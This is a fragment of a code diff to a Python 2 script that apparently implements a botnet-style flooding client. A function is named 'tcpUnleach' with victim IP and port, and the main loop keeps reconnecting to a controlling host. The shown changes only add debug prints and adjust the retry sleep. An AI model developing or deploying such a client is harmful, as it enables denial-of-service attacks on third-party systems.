@@ -120,10 +120,13 @@ def tcpUnleach(victimip, victimport):
     		thread.join()
 
 def main():
+	global host, port
+	print "%s - %s" %(host, port)
 	while 1:
 		s=socket(AF_INET, SOCK_STREAM)
 		while 1:
 			try:
+				print "%s - %s" %(host, port)
 				s.connect((host,port))
 				print "[INFO] Connected"
 				break
@@ -252,6 +255,4 @@ while 1:
 	try:
 		main()
 	except:
-		pass
-
-	time.sleep(5)
+		time.sleep(5)
